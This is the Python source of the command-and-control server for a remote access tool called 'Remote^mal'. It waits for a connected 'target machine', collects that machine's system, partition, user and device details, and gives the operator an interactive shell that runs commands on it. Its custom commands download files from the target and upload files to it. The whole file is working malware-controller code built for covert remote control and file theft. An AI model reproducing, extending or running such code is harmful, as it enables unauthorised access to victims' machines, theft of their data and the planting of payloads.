from Load import *
from tqdm import tqdm
import socket
import os
import sys
import time
import struct 
import threading

class RemoteServer(object):
    
    def __init__(self,Ip,PortId,CharSet="utf-32",Buffering=1024,file_transfer_buffer=1024):
       self.Ip=Ip                                       #Ipv4 Address Where  The Socket Server Need To Run
       self.PortId=PortId                               #Port ID of the Socket Server Need To Run
       self.Address=(Ip,PortId)                         #Address Where The Socket Sever Need To Run
       self.CharSet=CharSet                             #Character Set For Encoding And Decoding
       self.Buffering=Buffering                         #Buffering For Data Transmission (Increase Buffering Consume More Memory And High Speed Of Data Transmission via)
       self.RecvBuffer = list()                         #Buffer used to handle the combined data
       self.file_transfer_buffer = file_transfer_buffer #Buffer used to transfer binary files
    
    def BindServer(self):
        #Bind the serevr at the specified port
        self.server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.server_socket.bind(self.Address)
        self.server_socket.listen()
        print("\n\n\x1b[0;31m <!WAITING FOR THE TARGET>...\x1b[0m")
        self.client_socket,self.client_address=self.server_socket.accept()
        print(f"\x1b[0;31mConnected To The Target Machine >>>\x1b[0m \x1b[38;5;208m<{self.client_address[0]}>Ip <{self.client_address[1]}>PortID\x1b[0m\n\n")
        return None

    def Banner(self):
        #Loads The Command Line Banner For The Tool
        print("\x1b[33m_\x1b[0m"*150)
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print(Design.logo(text="<<<Remote^mal>>>",color="red"))
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print("\x1b[33m_\x1b[0m"*150)
        return None

    
    def send_size(self, size):
        # Pack the size as a big-endian unsigned long long (8 bytes)
        packed_size = struct.pack('>Q', size)
        
        # Pad with zeros if less than 8 bytes
        padded_size = packed_size.ljust(8, b'\x00')  # Ensure it’s exactly 8 bytes
        
        # Send the padded size
        self.client_socket.sendall(padded_size)


    def recv_size(self):
        # Receive exactly 8 bytes
        size_bytes = self.client_socket.recv(8)
            
        # Unpack the 8-byte buffer to get the size
        size = struct.unpack('>Q', size_bytes)[0]

        return size


    def send(self, data):
        # Append a null character to the data
        null_added_data = self.AppendNull(data)
        
        # Iterate over the data in chunks defined by self.Buffering
        for i in range(0, len(null_added_data), self.Buffering):
            # Extract a chunk of data
            chunk = null_added_data[i:i+self.Buffering]
            
            # Send the chunk to the client socket encoded with the specified character set
            self.client_socket.send(chunk.encode(self.CharSet)) 

        return None


    def recv(self):
        # Initialize an empty string to store received data
        data = ""
        flag = True

        # Check if there are items in the dequeue; if not, proceed to receive data
        dequeue = self.DequeueHandler()
        if not dequeue:
            while flag:
                # Receive a chunk of data from the client socket and decode it
                chunk = self.client_socket.recv(self.Buffering).decode(self.CharSet)

                # Check if the received chunk has at least one character
                if len(chunk) >= 1:
                    # If the last character is a null character, set flag to False to exit the loop
                    if chunk[-1] == '\0':
                        flag = False
                
                # Append the received chunk to the data string
                data += chunk
            
            # Split the received data by null characters and pass it to the EnqueueHandler
            return self.EnqueueHandler(data.split('\0')) 
        
        # Return the result of DequeueHandler if there were items to dequeue
        return dequeue
    


    def bin_send(self, bin_data):
        # Iterate through the binary data in chunks of size defined by file_transfer_buffer
        for i in range(0, len(bin_data), self.file_transfer_buffer):
            # Extract a chunk of binary data
            chunk = bin_data[i:i+self.file_transfer_buffer]
            # Send the chunk through the client socket
            self.client_socket.send(chunk) 
        
        # Return None after sending all chunks
        return None


    def bin_recv(self,file_size):
        
        # Calculate the number of chunks to receive based on the file size and buffer size
        num_of_chunks = (file_size + self.file_transfer_buffer - 1) // self.file_transfer_buffer

        # Iterate through the number of chunks and yield each received chunk
        for _ in range(num_of_chunks):
            # Receive a chunk of data from the client socket
            chunk = self.client_socket.recv(self.file_transfer_buffer)
            # Yield the received chunk for processing
            yield chunk


    def EnqueueHandler(self, next_data):
        # Iterate through the incoming data
        for data in next_data:
            # Skip any empty data entries
            if not data:
                continue
            # Append non-empty data to the receive buffer
            self.RecvBuffer.append(data)
        
        # Call and return the result of the DequeueHandler to process the buffer
        return self.DequeueHandler()

    def DequeueHandler(self):
        # Check if the receive buffer is not empty
        if len(self.RecvBuffer) != 0:
            # Remove the BOM (Byte Order Mark) from the front of the buffer
            # and replace the escaped null characters with actual null characters
            return self.remove_bom(self.RecvBuffer.pop(0)).replace('\\x00', '\x00')
        
        # Return None if the buffer is empty
        return None


    def remove_bom(self, data):
        try:
            # Remove the BOM (Byte Order Mark) character if it exists in the data
            return data.replace('\ufeff', '')
        except:
            # Return the original data if an exception occurs
            return data






    def DownloadTextFile(self, file_path):
        # Check if the file exists on the server
        is_file_exist = self.recv()
        if (is_file_exist == "True"):
            # Prompt user for download path and file name
            dld_path = input("\x1b[0;32m>>>Enter Download path:\x1b[0m")
            file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
            print("\n\n")
            # Check if the specified download path exists
            if os.path.exists(dld_path):
                self.send("True")  # Notify the server that the path is valid
                
                # Open the specified file for writing
                with open(dld_path + '/' + file_name, mode='w') as file:
                    file_content = self.recv()  # Receive the file content from the server
                    
                    # Write the content to the file, handling empty content case
                    if not file_content:
                        file.write('')
                    else:
                        file.write(file_content)
                        
                # Inform the user that the file was downloaded successfully
                print(f"\x1b[0;32m [+] {file_name} Downloaded Successfully\x1b[0m")
            else:
                self.send("False")  # Notify the server that the path does not exist
                print(f"\x1b[0;31m The download path {dld_path} doesn't exist\x1b[0m")
        else:
            # Inform the user that the target file path does not exist
            print(f"\x1b[0;31m The target path {file_path} doesn't exist\x1b[0m")






    def DownloadedBinaryFile(self, file_path):
        # Check if the binary file exists on the server
        is_file_exist = self.recv()
        if (is_file_exist == "True"):
            # Prompt user for download path and file name
            dld_path = input("\x1b[0;32m>>>Enter Download path:\x1b[0m")
            file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
            print("\n\n")
            # Check if the specified download path exists
            if os.path.exists(dld_path):
                self.send("True")  # Notify the server that the path is valid
                
                try:
                    # Open the specified file for binary writing with a defined buffer size
                    with open(dld_path + '/' + file_name, mode='wb', buffering=self.file_transfer_buffer) as file:

                        file_size = self.recv_size()    # Receive the total file size from the client
                        file_content = self.bin_recv(file_size)  # Receive the binary file content in chunks
                        num_of_chunks = (file_size + self.file_transfer_buffer - 1) // self.file_transfer_buffer #Total chunks to recieve
                        
                        for chunk in tqdm(file_content,total=num_of_chunks, colour='green', unit='B', unit_scale=True, desc=file_name, bar_format='{l_bar}{bar:30}{r_bar}'):
                            # Raise an error if a null byte is received, indicating permission denial
                            if (chunk == b'\x00'):
                                raise PermissionError("\n\x1b[0;31m Permission denied by the target [!] \x1b[0m\n")

                            # Raise an error for the string representation of a null byte
                            elif (chunk == b'\\x00'):
                                raise OSError(f"\n\x1b[0;31m While Downloading File: {file_name} an error occurred \x1b[0m\n")
                            else:
                                time.sleep(0.00005)    #This loads the progress bar slowly
                                file.write(chunk)  # Write the received chunk to the file

                except PermissionError as Perror:
                    print(str(Perror))  # Handle permission errors

                except OSError as oserror:
                    print(str(oserror))  # Handle other OS-related errors

                else:
                    # Inform the user that the binary file was downloaded successfully
                    print(f"\n\x1b[0;32m [+] {file_name} Downloaded Successfully\x1b[0m\n")

            else:
                self.send("False")  # Notify the server that the path does not exist
                print(f"\n\x1b[0;31m The download path {dld_path} doesn't exist\x1b[0m\n")

        else:
            # Inform the user that the target file path does not exist
            print(f"\n\x1b[0;31m The target path {file_path} doesn't exist\x1b[0m\n")




    def UploadTextFile(self, file_path):
        # Check if the specified file exists on the client side
        is_file_exist = os.path.exists(file_path)
        if (is_file_exist):
            self.send("True")  # Notify the server that the file exists
            
            # Prompt the user for the upload destination path on the server
            upld_path = input("\x1b[0;32m>>>Enter Upload path:\x1b[0m")
            self.send(upld_path)  # Send the upload path to the server
            
            # Prompt the user for the file name to be used on the server
            file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m")
            self.send(file_name)  # Send the file name to the server
            
            # Check if the specified upload path exists on the server
            is_upld_path_exist = self.recv()
            if (is_upld_path_exist == "True"):
                # Open the file in read mode and send its content to the server
                with open(file_path, mode='r') as file:
                    file_content = file.read()  # Read the entire file content
                    self.send(file_content)  # Send the file content to the server
                
                # Wait for a response from the server indicating the write operation result
                write_operation = self.recv()
                if (write_operation == "True"):
                    # Inform the user that the file was uploaded successfully
                    print(f"\x1b[0;32m [^] {file_name} Uploaded Successfully\x1b[0m")

            else:
                # Inform the user that the specified upload path does not exist
                print(f"\x1b[0;31m The upload path {upld_path} doesn't exist\x1b[0m")

        else:
            self.send("False")  # Notify the server that the file does not exist
            print(f"\x1b[0;31m The path {file_path} doesn't exist\x1b[0m")



    def UploadBinaryFile(self, file_path):
        # Check if the specified binary file exists on the client side
        is_file_exist = os.path.exists(file_path)
        if is_file_exist:
            self.send("True")  # Notify the server that the file exists
            
            # Prompt the user for the upload destination path on the server
            upld_path = input("\x1b[0;32m>>>Enter Upload path:\x1b[0m ")
            self.send(upld_path)  # Send the upload path to the server
            
            # Prompt the user for the file name to be used on the server
            file_name = input("\x1b[0;32m>>>Enter File Name:\x1b[0m ")
            self.send(file_name)  # Send the file name to the server
            print("\n\n")
            
            # Check if the specified upload path exists on the server
            is_upld_path_exist = self.recv()
            if is_upld_path_exist == "True":
                try:
                    # Open the binary file in read mode with specified buffering
                    with open(file_path, mode='rb', buffering=self.file_transfer_buffer) as file:
                        file_size = os.path.getsize(file_path)  # Get the size of the file
                        self.send_size(file_size)  # Send the file size to the server
                        
                        # Initialize tqdm progress bar
                        with tqdm(total=file_size, unit='B',colour="red",unit_scale=True, desc=file_name, bar_format='{l_bar}{bar:30}{r_bar}') as pbar:
                            total_sent = 0  # Variable to keep track of total bytes sent

                            while True:
                                time.sleep(0.00005)    #This loads the progress bar slowly
                                # Read chunks of the file based on the buffer size
                                file_chunk = file.read(self.file_transfer_buffer)

                                if not file_chunk:
                                    break  # Exit loop if there are no more chunks to read

                                self.bin_send(file_chunk)  # Send the binary chunk to the server
                                total_sent += len(file_chunk)  # Update total bytes sent
                                pbar.update(len(file_chunk))  # Update the progress bar
                                

                except PermissionError as perror:
                    # Handle permission errors by notifying the server and sending a specific error signal
                    self.send_size(1)
                    self.bin_send(b'\x00')

                except OSError as oserror:
                    # Handle other OS-related errors by notifying the server and sending a different error signal
                    self.send_size(1)
                    self.bin_send(b'\\x00')

                else:
                    # Wait for a response from the server indicating the write operation result
                    write_operation = self.recv()
                    if write_operation == "True":
                        # Inform the user that the file was uploaded successfully
                        print(f"\x1b[0;32m [^] {file_name} Uploaded Successfully\x1b[0m")

            else:
                # Inform the user that the specified upload path does not exist
                print(f"\x1b[0;31m The upload path {upld_path} doesn't exist\x1b[0m")

        else:
            self.send("False")  # Notify the server that the file does not exist
            print(f"\x1b[0;31m The path {file_path} doesn't exist\x1b[0m")



    def GetBuffer(self,flag=False):
        while(flag):
            try:
                #Change the default Buffer Size
                Buffer=input("\x1b[32m>>>Enter the Buffering Amount:\x1b[0m")
                #validating the Buffer Size
                assert (int(Buffer)<=999999999 and int(Buffer)>=1024),"\n\n \x1b[0;31m<Error>: [!]Buffer Size Cannot Be Accepted,It Should Range Between (1024 to 999999999)\x1b[0m\n\n"
                return Buffer
            except AssertionError as e:
                print(e)
        return str(self.Buffering)
    
    def SetBuffer(self):
        #Set Buffering Both Server and client Side
        try:
            if sys.argv[1]=='-b':
                Buffer=self.GetBuffer(flag=True)
            else:
                Buffer=self.GetBuffer()
        except IndexError:
                Buffer=self.GetBuffer()
        print(f"\n\x1b[32m[+]Sockets Are  Buffered with {Buffer}b For Data Transmission\x1b[0m\n")
        self.send(Buffer)
        #Change The Value Of Buffering
        self.Buffering=int(Buffer)
        return None

    def LocationOfFile(self):
        #Get The  Location of the <client>  File Downloaded Path
        self.path=self.recv()
        self.current_path=self.path
        return None

    def AppendNull(self, data):
        # Replace all null characters with the escape sequence '\x00'
        data = data.replace('\x00', '\\x00')  
        
        # Append a null character at the end of the modified data
        return data + '\0'  


    def Partitions(self):
        #recieve the partitions and mountpoints of the client
        self.partitions=self.recv()
        self.mountpoints=self.recv()

    def PartitionsInfo(self):
        #recieve  the Partitions information such as Name,Mountpoint,(Fixed,Removed),MemorySize
        self.partitions_info=self.recv()

    def PartitionTable(self):
        #Display the partition table of the client
        table_data=[["Partition","MountPoint","Type","Memory(GB)"]]
        for data in PathLib.remover(self.partitions_info.splitlines()):
            table_data.append(data.split("\t"))
        
        return table_data


    def SysPlatform(self):
        #Configure the System platform of the client
        #Windows - win32 , Linux -linux ,Mac -darwin
        self.platform=self.recv()
        return None
        
    def SysInfo(self):
        #Receive the system information of the client
        keys=[]
        values=[]
        Info=self.recv()
        for line in Info.splitlines():
            for data in line.split("<,>"):
                key,value=data.split("<:>")
                keys.append(key)
                values.append(value)
        table_data=[keys,values]
        return table_data

    def GetUserAndDevice(self):

        #Recieve the User and device name for current logged user
        self.user=self.recv()
        self.device=self.recv()
        return None


    def DisplaySysInfo(self,table_data):

        #Dispaly the tabular information of client system
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print(Design.logo(text=">"+self.platform,color="green"))
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print()
        print("\x1b[32m[^]System Information\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print("\x1b[0;31m"+Design.MakeTable(table_data,Design.findwidth(table_data)).draw()+"\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
       
    def DisplayPartitionInfo(self,table_data):

        #Dispaly the tabular information of client Partiton
        print(f"\x1b[33m<Warning>: If the Memory is (-1) the file system is not valid for the {self.platform}\x1b[0m")
        print()
        print("\x1b[32m[^]Partition Information\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()
        print("\x1b[0;31m"+Design.MakeTable(table_data,Design.findwidth(table_data)).draw()+"\x1b[0m")
        print()
        print("\x1b[33m_\x1b[0m"*150)
        print()


    def WinPathConfig(self,cmd):

        #Coping current path location
        self.current_path=self.path
        cmd=PathLib.JoinPath(PathLib.RemoveDot(PathLib.remover(PathLib.splitdirectory(cmd[3:len(cmd)]))))
        #Path configuration for directory navigation
        #Relative path navigation
        
        if (not PathLib.isabsolute(cmd) and PathLib.CountDirectories(cmd)>=1):
            self.path+="\\"+cmd

        #Absolute path navigation
        elif (PathLib.isabsolute(cmd)):
            
            if(PathLib.CountDirectories(cmd)>=1):
                self.path=cmd
            else:
                if cmd[-1]=="\\":
                    self.path=cmd
                else:
                    self.path=cmd+"\\"

        self.path=PathLib.replacer(self.path)
        self.path=PathLib.JoinPath(PathLib.RemoveDot(PathLib.remover(PathLib.splitdirectory(self.path))))
        self.send(self.path)

    def WinBackDir(self,cmd):
        #return to the parent directory
        cmd=PathLib.JoinPath(PathLib.BackDotRemover(PathLib.remover(PathLib.splitdirectory(cmd[3:len(cmd)]))))
        self.current_path=self.path
        drive,cwd=PathLib.DriveAPath(self.path)        #return the path and drive in the absolute path
        self.path=PathLib.BackDir(drive,cwd,cmd)
        self.send(self.path)
        
    def UnixPathConfig(self,cmd):

        #Coping current path location
        self.current_path=self.path
        cmd=UnixPathLib.JoinrootPath(UnixPathLib.BackDotRemover(UnixPathLib.remover(UnixPathLib.splitdirectory(cmd[3:len(cmd)]))))
        #Path configuration for directory navigation for Unix Systems
        #Relative path navigation
        if (not UnixPathLib.isabsolute(cmd,self.user)):
            cmd=UnixPathLib.JoinrootPath(UnixPathLib.remover(UnixPathLib.splitdirectory(cmd)))
            self.path+="/"+cmd

        #Absolute path navigation
        elif(UnixPathLib.isabsolute(cmd,self.user)):
            cmd=UnixPathLib.JoinrootPath(UnixPathLib.remover(UnixPathLib.splitdirectory(cmd)))
            self.path=cmd


        self.path=UnixPathLib.ReverseReplacer(self.path,self.user)
        self.send(self.path)

    def UnixBackDir(self,cmd):
        #Used to return to Parent Directory Navigation.
        self.current_path=self.path
        cmd=UnixPathLib.JoinrootPath(UnixPathLib.BackDotRemover(UnixPathLib.remover(UnixPathLib.splitdirectory(cmd[3:len(cmd)]))))
        self.path=UnixPathLib.BackDir(self.user,UnixPathLib.ReverseReplacer(self.path,self.user),UnixPathLib.ReverseReplacer(cmd,self.user))
        self.send(self.path)


    def VerifyPath(self):
        #Verify whether the path is client's path
        flag=self.recv()
        if (flag=="TRUE"):
            pass
        else:
            self.path=self.current_path 
            

    def Getstdin(self):
        #(Stdin) Reciever for the subprocess created by client
        #Recieve the input for the command executed
        while(True):
            #Recieve the flag to indicate the client wheather input is comming or not
            flag=input("\x1b[33m(Does the above command requires any input[Y or N])\x1b[0m?") 

            if(flag.upper()=="Y"): #check the flag is Y for Yes
                self.send(flag)
                stdin=input("\x1b[33m<Input>$\x1b[0m")
                self.send(stdin)
                break

            elif(flag.upper()=="N"): #check the flag is N for no
                self.send(flag)
                break

            else:
                print("\x1b[0;31mWrong input:(Y or N)\x1b[0m") #Any other input considered as wrong
                

    def close(self):
        #close the socket connection.
        print(f"\x1b[0;31mTarget Connection Disconnected:\x1b[0m\n\x1b[0;34m1)Ip:{self.Ip}\n2)PortId:{self.PortId}\n3)UserName:{self.user}\n4)DeviceName:{self.device}\x1b[0m")                   #Message Indicate Closing Connection.
        self.server_socket.close()
        sys.exit(0)     #Exit the Program with Success Code 0. 
        return None


    def main(self):
        #Entry Point of the Program ,Remote Command Execution Start Point:)

        if(self.platform=="win32"):

            #The code Block of windows command execution
            while(True):
                

                #Recieve the command to be executed in Target machine
                cmd=input(f"\x1b[0;34m{self.path}>\x1b[0m")
                self.send(cmd)  #send the command to the client

                if(not cmd):
                    continue

                if((cmd.split()[0]=="cd") and (len(cmd.split())>=2 )):
                    
                    #<WINDOWS>Parent Directory Navigation
                    if(PathLib.isBack(cmd[3:len(cmd)])):
                        self.WinBackDir(cmd)
                        self.VerifyPath()

                    #<WINDOWS>Child Directory Navigation
                    else:
                        self.WinPathConfig(cmd)
                        self.VerifyPath()

                # Check if the command is for downloading a file using RemoteMal
                elif (cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split()) >= 3):
                    option = cmd.split()[1]  # Extract the option (either -t for text or -b for binary)
                    
                    # Extract the file path from the command, replacing backslashes with forward slashes
                    file_path = cmd[len("remotemal-dld -t "):].replace("\\", "/")
                    
                    # Handle text file download
                    if (option == '-t'):
                        self.DownloadTextFile(file_path)
                        
                    # Handle binary file download
                    elif (option == '-b'):
                        self.DownloadedBinaryFile(file_path)
                        
                    else:
                        # Inform the user of an invalid option for the download command
                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-dld\x1b[0m\n\n")

                # Check if the command is for uploading a file using RemoteMal
                elif (cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split()) >= 3):
                    option = cmd.split()[1]  # Extract the option (either -t for text or -b for binary)
                    
                    # Extract the file path from the command, replacing backslashes with forward slashes
                    file_path = cmd[len("remotemal-upld -t "):].replace("\\", "/")
                    
                    # Handle text file upload
                    if (option == '-t'):
                        self.UploadTextFile(file_path)
                        
                    # Handle binary file upload
                    elif (option == '-b'):
                        self.UploadBinaryFile(file_path)
                        
                    else:
                        # Inform the user of an invalid option for the upload command
                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-upld\x1b[0m\n\n")


                elif(cmd.lower()=="remotequit"):
                    self.close() #Close the socket connection.


                else:
                    # Receive the output for the command execution
                    self.Getstdin()  # Call a method to get standard input for command execution

                    # Receive a flag indicating the success of the command execution
                    flag = self.recv()

                    # Check if the command execution resulted in an error
                    if (flag == "Yes"):
                        # Receive and print the error output (stderr)
                        stderr = self.recv()
                        print(f"\n\x1b[0;31m{stderr}\x1b[0m\n")  # Print error output in red
                    else:
                        # Receive and print the standard output (stdout)
                        stdout = self.recv()
                        print(f"\n\x1b[0;32m{stdout}\x1b[0m\n")  # Print standard output in green

             



        elif(self.platform=="linux" or self.platform=="darwin"):

            #The code Block of linux or Mac command execution
            while(True):
                

                #Recieve the command to be executed in Target machine
                cmd=input(f"\n\n\x1b[0;32m{self.user}@{self.device}\x1b[0m:\x1b[0;34m{UnixPathLib.replacer(self.path,self.user)}\x1b[0m$")
                self.send(cmd) #send the command to the client

                if(not cmd):
                    continue

                #Check wheather the contains cd (change directory) for directory navigation
                if((cmd.split()[0]=="cd") and (len(cmd.split())>=2 )):

                    #<UNIX>Parent Directory Navigation
                    if(UnixPathLib.isBack(cmd[3:len(cmd)])):
                        self.UnixBackDir(cmd)
                        self.VerifyPath()

                    #<UNIX>Child Directory Navigation  
                    else:
                        self.UnixPathConfig(cmd)
                        self.VerifyPath()


                # Check if the command is to download a file
                elif (cmd.split()[0].lower() == "remotemal-dld" and len(cmd.split()) >= 3):
                    option = cmd.split()[1]  # Get the download option (-t or -b)
                    file_path = cmd[len("remotemal-dld -t ") :].replace("\\", "/")  # Extract and format the file path
                    if (option == '-t'):
                        self.DownloadTextFile(file_path)  # Call method to download a text file
                    elif (option == '-b'):
                        self.DownloadedBinaryFile(file_path)  # Call method to download a binary file
                    else:
                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-dld\x1b[0m\n\n")  # Invalid option error message

                # Check if the command is to upload a file
                elif (cmd.split()[0].lower() == "remotemal-upld" and len(cmd.split()) >= 3):
                    option = cmd.split()[1]  # Get the upload option (-t or -b)
                    file_path = cmd[len("remotemal-upld -t ") :].replace("\\", "/")  # Extract and format the file path
                    if (option == '-t'):
                        self.UploadTextFile(file_path)  # Call method to upload a text file
                    elif (option == '-b'):
                        self.UploadBinaryFile(file_path)  # Call method to upload a binary file
                    else:
                        print(f"\n\x1b[0;31mInvalid Option: {option} for remotemal-upld\x1b[0m\n\n")  # Invalid option error message

                # Check if the command is to quit the remote session
                elif (cmd.lower() == "remotequit"):
                    self.close()  # Close the socket connection.

                else:
                    # Receive the output for the command execution
                    self.Getstdin()  # Get standard input for the command
                    flag = self.recv()  # Receive a flag indicating the success of the command execution

                    if (flag == "Yes"):
                        stderr = self.recv()  # Receive and print the error output (stderr)
                        print(f"\n\n\x1b[0;31m{stderr}\x1b[0m\n\n")  # Print error output in red
                    else:
                        stdout = self.recv()  # Receive and print the standard output (stdout)
                        print(f"\n\n\x1b[0;32m{stdout}\x1b[0m\n\n")  # Print standard output in green

                    


        else:

            #RemoteMal Can only work on (Windows,linux,mac) Any other platform will not be Accepted
            print(f"Invalid Operating System {self.platform}") #Message indicates client is running in invalid operating system
            self.close() #close the connection




if __name__=="__main__":
    r=RemoteServer("127.0.0.1",5136)
    r.Banner()
    r.BindServer()
    r.SetBuffer()
    r.Partitions()
    r.LocationOfFile()
    r.SysPlatform()
    r.DisplaySysInfo(r.SysInfo())
    r.PartitionsInfo()
    r.table_data=r.PartitionTable()
    r.DisplayPartitionInfo(r.table_data)
    r.GetUserAndDevice()
    r.main()

#######################################################################################################################################
    
    
    


   
    
